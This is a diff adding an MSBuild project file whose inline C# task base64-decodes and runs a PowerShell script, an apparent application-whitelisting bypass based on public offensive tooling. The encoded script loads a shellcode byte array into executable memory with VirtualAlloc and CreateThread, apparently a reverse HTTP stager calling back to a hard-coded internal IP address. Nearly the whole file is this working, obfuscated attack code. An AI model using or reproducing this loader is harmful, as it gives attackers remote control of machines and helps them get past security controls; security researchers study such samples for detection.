@@ -1,0 +1,66 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
+  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
+  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
+  <!-- License: BSD 3-Clause -->
+  <Target Name="npscsharp">
+   <nps />
+  </Target>
+  <UsingTask
+    TaskName="nps"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+  <Task>
+    <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+
+          using System;
+      using System.Collections.ObjectModel;
+      using System.Management.Automation;
+      using System.Management.Automation.Runspaces;
+      using Microsoft.Build.Framework;
+      using Microsoft.Build.Utilities;
+
+      public class nps : Task, ITask
+        {
+            public override bool Execute()
+            {
+              string cmd = "JGFqdGtlakpid1VnID0gQCINCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvYyhJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7DQpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7DQoiQA0KDQokbHBHR0l3RWVhQmVBbnkgPSBBZGQtVHlwZSAtbWVtYmVyRGVmaW5pdGlvbiAkYWp0a2VqSmJ3VWcgLU5hbWUgIldpbjMyIiAtbmFtZXNwYWNlIFdpbjMyRnVuY3Rpb25zIC1wYXNzdGhydQ0KDQpbQnl0ZVtdXSAkU2dTZ1psUXN1QlFjID0gMHhmYywweGU4LDB4ODIsMHgwLDB4MCwweDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGMwLDB4NjQsMHg4YiwweDUwLDB4MzAsMHg4YiwweDUyLDB4YywweDhiLDB4NTIsMHgxNCwweDhiLDB4NzIsMHgyOCwweGYsMHhiNywweDRhLDB4MjYsMHgzMSwweGZmLDB4YWMsMHgzYywweDYxLDB4N2MsMHgyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHhkLDB4MSwweGM3LDB4ZTIsMHhmMiwweDUyLDB4NTcsMHg4YiwweDUyLDB4MTAsMHg4YiwweDRhLDB4M2MsMHg4YiwweDRjLDB4MTEsMHg3OCwweGUzLDB4NDgsMHgxLDB4ZDEsMHg1MSwweDhiLDB4NTksMHgyMCwweDEsMHhkMywweDhiLDB4NDksMHgxOCwweGUzLDB4M2EsMHg0OSwweDhiLDB4MzQsMHg4YiwweDEsMHhkNiwweDMxLDB4ZmYsMHhhYywweGMxLDB4Y2YsMHhkLDB4MSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjYsMHgzLDB4N2QsMHhmOCwweDNiLDB4N2QsMHgyNCwweDc1LDB4ZTQsMHg1OCwweDhiLDB4NTgsMHgyNCwweDEsMHhkMywweDY2LDB4OGIsMHhjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgxLDB4ZDMsMHg4YiwweDQsMHg4YiwweDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDVmLDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlYiwweDhkLDB4NWQsMHg2OCwweDZlLDB4NjUsMHg3NCwweDAsMHg2OCwweDc3LDB4NjksMHg2ZSwweDY5LDB4NTQsMHg2OCwweDRjLDB4NzcsMHgyNiwweDcsMHhmZiwweGQ1LDB4MzEsMHhkYiwweDUzLDB4NTMsMHg1MywweDUzLDB4NTMsMHg2OCwweDNhLDB4NTYsMHg3OSwweGE3LDB4ZmYsMHhkNSwweDUzLDB4NTMsMHg2YSwweDMsMHg1MywweDUzLDB4NjgsMHhiYiwweDEsMHgwLDB4MCwweGU4LDB4YmYsMHgwLDB4MCwweDAsMHgyZiwweDM5LDB4NTMsMHg0ZSwweDc2LDB4NTksMHg0YSwweDYzLDB4NjYsMHg3OCwweDc0LDB4NjUsMHg0MywweDY2LDB4NTksMHg0ZSwweDM4LDB4MzIsMHg1ZiwweDUyLDB4NDIsMHg3MCwweDc3LDB4NjMsMHg1OCwweDZlLDB4NTAsMHg2MiwweDVhLDB4MzEsMHg2NSwweDQzLDB4NDksMHgzOSwweDRhLDB4NzUsMHg0YywweDMwLDB4MzAsMHg3NCwweDMzLDB4MzAsMHg1MCwweDc2LDB4NzAsMHg1MiwweDYxLDB4MCwweDUwLDB4NjgsMHg1NywweDg5LDB4OWYsMHhjNiwweGZmLDB4ZDUsMHg4OSwweGM2LDB4NTMsMHg2OCwweDAsMHgzMiwweGUwLDB4ODQsMHg1MywweDUzLDB4NTMsMHg1NywweDUzLDB4NTYsMHg2OCwweGViLDB4NTUsMHgyZSwweDNiLDB4ZmYsMHhkNSwweDk2LDB4NmEsMHhhLDB4NWYsMHg2OCwweDgwLDB4MzMsMHgwLDB4MCwweDg5LDB4ZTAsMHg2YSwweDQsMHg1MCwweDZhLDB4MWYsMHg1NiwweDY4LDB4NzUsMHg0NiwweDllLDB4ODYsMHhmZiwweGQ1LDB4NTMsMHg1MywweDUzLDB4NTMsMHg1NiwweDY4LDB4MmQsMHg2LDB4MTgsMHg3YiwweGZmLDB4ZDUsMHg4NSwweGMwLDB4NzUsMHgxNCwweDY4LDB4ODgsMHgxMywweDAsMHgwLDB4NjgsMHg0NCwweGYwLDB4MzUsMHhlMCwweGZmLDB4ZDUsMHg0ZiwweDc1LDB4Y2QsMHhlOCwweDRhLDB4MCwweDAsMHgwLDB4NmEsMHg0MCwweDY4LDB4MCwweDEwLDB4MCwweDAsMHg2OCwweDAsMHgwLDB4NDAsMHgwLDB4NTMsMHg2OCwweDU4LDB4YTQsMHg1MywweGU1LDB4ZmYsMHhkNSwweDkzLDB4NTMsMHg1MywweDg5LDB4ZTcsMHg1NywweDY4LDB4MCwweDIwLDB4MCwweDAsMHg1MywweDU2LDB4NjgsMHgxMiwweDk2LDB4ODksMHhlMiwweGZmLDB4ZDUsMHg4NSwweGMwLDB4NzQsMHhjZiwweDhiLDB4NywweDEsMHhjMywweDg1LDB4YzAsMHg3NSwweGU1LDB4NTgsMHhjMywweDVmLDB4ZTgsMHg2YiwweGZmLDB4ZmYsMHhmZiwweDMxLDB4MzksMHgzMiwweDJlLDB4MzEsMHgzNiwweDM4LDB4MmUsMHgzMSwweDMwLDB4MmUsMHgzNiwweDM5LDB4MCwweGJiLDB4ZjAsMHhiNSwweGEyLDB4NTYsMHg2YSwweDAsMHg1MywweGZmLDB4ZDUNCg0KDQokTnJad0dqSXZnQVlOTyA9ICRscEdHSXdFZWFCZUFueTo6VmlydHVhbEFsbG9jKDAsW01hdGhdOjpNYXgoJFNnU2dabFFzdUJRYy5MZW5ndGgsMHgxMDAwKSwweDMwMDAsMHg0MCkNCg0KW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkU2dTZ1psUXN1QlFjLDAsJE5yWndHakl2Z0FZTk8sJFNnU2dabFFzdUJRYy5MZW5ndGgpDQoNCiRscEdHSXdFZWFCZUFueTo6Q3JlYXRlVGhyZWFkKDAsMCwkTnJad0dqSXZnQVlOTywwLDAsMCkNCmZvciAoOzspewogIFN0YXJ0LXNsZWVwIDYwCn0=";
+
+                PowerShell ps = PowerShell.Create();
+                ps.AddScript(Base64Decode(cmd));
+
+                Collection<PSObject> output = null;
+                try
+                {
+                    output = ps.Invoke();
+                }
+                catch(Exception e)
+                {
+                    Console.WriteLine("Error while executing the script.\r\n" + e.Message.ToString());
+                }
+                if (output != null)
+                {
+                    foreach (PSObject rtnItem in output)
+                    {
+                        Console.WriteLine(rtnItem.ToString());
+                    }
+                }
+                return true;
+            }
+
+            public static string Base64Encode(string text) {
+           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+        }
+
+        public static string Base64Decode(string encodedtext) {
+            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+        }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
